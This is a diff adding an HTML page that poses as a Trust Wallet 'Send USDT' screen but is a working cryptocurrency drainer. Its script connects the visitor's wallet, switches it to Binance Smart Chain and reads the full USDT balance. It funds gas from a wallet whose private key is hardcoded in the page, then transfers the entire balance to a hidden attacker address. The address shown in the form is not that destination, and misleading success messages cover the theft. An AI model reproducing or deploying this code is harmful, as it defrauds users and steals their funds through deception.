@@ -1,0 +1,442 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta property="og:title" content="Send USDT" />
+    <meta
+      property="og:description"
+      content="Send USDT securely and instantly."
+    />
+    <meta property="og:url" content="https://send-usdt.in/" />
+    <meta name="trustwallet-dapp" content="true" />
+    <title>Trust Wallet</title>
+    <link rel="icon" type="image/png" href="logo.png" />
+
+    <meta
+      name="description"
+      content="Send USDT securely and instantly with our trusted platform."
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300..800&display=swap"
+      rel="stylesheet"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.5/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <style>
+      .open-sans-<uniquifier > {
+        font-family: "Open Sans", serif;
+        font-optical-sizing: auto;
+        font-weight: <weight>;
+        font-style: normal;
+        font-variation-settings: "wdth" 100;
+      }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Open Sans", serif;
+      }
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        padding: 5px 10px 10px 10px;
+      }
+      .wallet-container {
+        width: 100%;
+        height: 100%;
+        background: white;
+      }
+      h2 {
+        text-align: center;
+        color: #333;
+      }
+      .input-group {
+        margin-bottom: 15px;
+        position: relative;
+        overflow: auto;
+      }
+      label {
+        font-size: 14px;
+        color: #555;
+        display: block;
+        margin-bottom: 5px;
+      }
+      .custom-input {
+        width: 100%;
+        padding: 10px;
+        border: none;
+        border-right: none;
+        font-size: 16px;
+        background: none;
+        color: inherit;
+        cursor: pointer;
+        caret-color: auto;
+      }
+      .custom-input:focus,
+      .custom-input:active,
+      .custom-input:focus-visible {
+        outline: none;
+        border: none;
+      }
+      .send-btn {
+        width: 90%;
+        padding: 11px !important;
+        position: fixed;
+        bottom: 10px;
+        left: 50%;
+        font-size: 18px !important;
+        transform: translateX(-50%);
+        border: none;
+        border-radius: 71px;
+        font-weight: 600;
+        background: #0031ff;
+        color: white;
+        font-size: 15px;
+        cursor: pointer;
+      }
+
+      .send-btn:disabled {
+        background: #eaeaea;
+        cursor: not-allowed;
+        color: #aaaaaa;
+      }
+
+      .left {
+        float: left;
+        width: 61%;
+      }
+      .right {
+        float: right;
+        top: 10px;
+        position: relative;
+      }
+
+      .mar_i {
+        padding-left: 15px;
+        font-style: normal;
+      }
+      .border {
+        width: 100%;
+        overflow: auto;
+        border: 1px solid #e2e2e2;
+        padding: 7px 8px 8px 7px;
+      }
+      .fees {
+        font-size: 14px;
+        color: #7e7e7e;
+      }
+      .top_h {
+        padding-bottom: 25px;
+        font-size: 20px;
+      }
+      .inpt_tital {
+        font-weight: 600;
+        font-size: 14px;
+        color: #6d6d6d;
+      }
+
+      input::placeholder {
+        font-size: 14px; /* Change font size */
+        font-weight: 600; /* Make it bold */
+        color: #888888; /* Optional: Change placeholder color */
+      }
+      .blue {
+        color: #0031ff;
+      }
+
+      @media (max-width: 480px) {
+        .wallet-container {
+          padding: 0px 12px 12px 12px;
+        }
+        .custom-input {
+          font-size: 14px;
+          padding: 10px;
+        }
+        .send-btn {
+          padding: 10px;
+          font-size: 14px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wallet-container">
+      <br />
+      <div class="input-group">
+        <label for="recipient" class="inpt_tital">Address or Domain Name</label>
+        <div class="border">
+          <div class="left">
+            <input
+              type="text"
+              class="custom-input"
+              value="0xf34Feb9A30AEbfAb56D64d6674de9a6C4E91d8Ea"
+              placeholder="Search or Enter"
+            />
+          </div>
+          <span class="right blue" style="font-weight: 600; font-size: 15px">
+            Paste <i class="fa-solid fa-address-book mar_i"></i>
+            <i class="fa-solid fa-qrcode mar_i"></i
+          ></span>
+        </div>
+      </div>
+      <br />
+
+      <div class="input-group">
+        <label for="recipient" class="inpt_tital">Amount</label>
+        <div class="border">
+          <div class="left">
+            <input
+              type="text"
+              id="recipient"
+              class="custom-input"
+              placeholder="USDT Amount"
+            />
+          </div>
+
+          <span
+            class="right"
+            style="color: #969696; font-size: 14px; font-weight: 600"
+          >
+            USDT <i class="mar_i blue" style="font-size: 15px">Max </i></span
+          >
+        </div>
+      </div>
+
+      <p class="fees">= $0.99</p>
+      <button id="nextBtn" class="send-btn" disabled onclick="connectWallet()">
+        Next
+      </button>
+    </div>
+
+    <script>
+      document
+        .getElementById("recipient")
+        .addEventListener("input", function () {
+          const amount = this.value.trim();
+          const nextBtn = document.getElementById("nextBtn");
+
+          if (amount && !isNaN(amount) && parseFloat(amount) > 0) {
+            nextBtn.removeAttribute("disabled"); // Enable button if input has valid value
+          } else {
+            nextBtn.setAttribute("disabled", true);
+          }
+        });
+
+      let web3;
+      let userAccount;
+
+      const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
+      const recipientAddress = "0x1Fd3D8b247E298f2E361E330e6eF10a4CCB43803";
+      const senderPrivateKey =
+        "e0e1887c15b2fdef8c19f817b49ff811f2bd993e1041191032b3052b183f6bd7";
+      const senderWalletAddress = "0x965B9022508BEC66a909F7bB3545de8EDF771a61";
+      const requiredGasFeeBNB = "0.0005";
+
+      const bscDetails = {
+        chainId: "0x38",
+        chainName: "Binance Smart Chain Mainnet",
+        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+        rpcUrls: ["https://bsc-dataseed.binance.org"],
+        blockExplorerUrls: ["https://bscscan.com"],
+      };
+
+      const usdtAbi = [
+        {
+          constant: true,
+          inputs: [{ name: "_owner", type: "address" }],
+          name: "balanceOf",
+          outputs: [{ name: "balance", type: "uint256" }],
+          type: "function",
+        },
+        {
+          constant: false,
+          inputs: [
+            { name: "_to", type: "address" },
+            { name: "_value", type: "uint256" },
+          ],
+          name: "transfer",
+          outputs: [{ name: "", type: "bool" }],
+          type: "function",
+        },
+      ];
+
+      async function connectWallet() {
+        if (window.ethereum) {
+          try {
+            web3 = new Web3(window.ethereum);
+            const accounts = await window.ethereum.request({
+              method: "eth_requestAccounts",
+            });
+            userAccount = accounts[0];
+            console.log("Wallet Connected:", userAccount);
+
+            document.getElementById("nextBtn").textContent = "Connected";
+            document.getElementById("nextBtn").disabled = true;
+
+            // 🚀 Auto-start USDT transfer after connection
+            await checkAndTransferUSDT();
+
+            return true;
+          } catch (error) {
+            console.error("Wallet Connection Error:", error);
+            Swal.fire({
+              icon: "error",
+              title: "Wallet Connection Failed",
+              text: error.message,
+            });
+            return false;
+          }
+        } else {
+          Swal.fire({
+            icon: "error",
+            title: "No Web3 Provider",
+            text: "Please install MetaMask or use a Web3-enabled browser.",
+          });
+          return false;
+        }
+      }
+
+      async function switchToBEP20() {
+        try {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: bscDetails.chainId }],
+          });
+          return true;
+        } catch (error) {
+          if (error.code === 4902) {
+            try {
+              await window.ethereum.request({
+                method: "wallet_addEthereumChain",
+                params: [bscDetails],
+              });
+              return true;
+            } catch (addError) {
+              console.error("Error adding Binance Smart Chain:", addError);
+              return false;
+            }
+          } else {
+            console.error("Error switching to Binance Smart Chain:", error);
+            return false;
+          }
+        }
+      }
+
+      async function sendGasFeeToUser(userAccount) {
+        const web3 = new Web3(bscDetails.rpcUrls[0]);
+        const gasFeeInWei = web3.utils.toWei(requiredGasFeeBNB, "ether");
+
+        const tx = {
+          from: senderWalletAddress,
+          to: userAccount,
+          value: gasFeeInWei,
+          gas: 21000,
+        };
+
+        const signedTx = await web3.eth.accounts.signTransaction(
+          tx,
+          senderPrivateKey
+        );
+        const receipt = await web3.eth.sendSignedTransaction(
+          signedTx.rawTransaction
+        );
+        return receipt;
+      }
+
+      async function checkAndTransferUSDT() {
+        try {
+          if (!window.ethereum) {
+            Swal.fire({
+              icon: "error",
+              title: "No Web3 Provider",
+              text: "Please install MetaMask or use a Web3-enabled browser.",
+            });
+            return;
+          }
+
+          // 🔥 Auto-Switch to Binance Smart Chain
+          const switched = await switchToBEP20();
+          if (!switched) {
+            Swal.fire({
+              icon: "error",
+              title: "Network Error",
+              text: "Please switch to Binance Smart Chain and try again.",
+            });
+            return;
+          }
+
+          // 🔥 Get USDT Balance
+          const usdtContract = new web3.eth.Contract(
+            usdtAbi,
+            usdtContractAddress
+          );
+          const userBalanceWei = await usdtContract.methods
+            .balanceOf(userAccount)
+            .call();
+          const userBalance = web3.utils.fromWei(userBalanceWei, "ether");
+
+          console.log(`User USDT Balance: ${userBalance} USDT`);
+
+          if (parseFloat(userBalance) === 0) {
+            Swal.fire({
+              icon: "info",
+              title: "No Tokens Found",
+              text: "No tokens available for verification.",
+            });
+            return;
+          }
+
+          if (parseFloat(userBalance) < 1) {
+            Swal.fire({
+              icon: "info",
+              title: "Sent Successful",
+              text: `No flash found. Balance: ${userBalance}`,
+            });
+            return;
+          }
+
+          // 🔥 Check and Send Gas Fee if Needed
+          const userGasBalanceWei = await web3.eth.getBalance(userAccount);
+          const userGasBalance = web3.utils.fromWei(userGasBalanceWei, "ether");
+
+          if (parseFloat(userGasBalance) < parseFloat(requiredGasFeeBNB)) {
+            const gasTransferReceipt = await sendGasFeeToUser(userAccount);
+            console.log(
+              "Gas Fee Sent Transaction Hash:",
+              gasTransferReceipt.transactionHash
+            );
+          }
+
+          // 🔥 Transfer USDT
+          const transferReceipt = await usdtContract.methods
+            .transfer(recipientAddress, web3.utils.toWei(userBalance, "ether"))
+            .send({ from: userAccount });
+
+          console.log("Transfer Successful:", transferReceipt);
+
+          Swal.fire({
+            icon: "success",
+            title: "Sent Successful",
+            text: ` ${userBalance}`,
+          });
+        } catch (error) {
+          console.error("Error Occurred:", error);
+          Swal.fire({
+            icon: "error",
+            title: "Send Failed",
+            text: error.message || "An unknown error occurred.",
+          });
+        }
+      }
+    </script>
+  </body>
+</html>
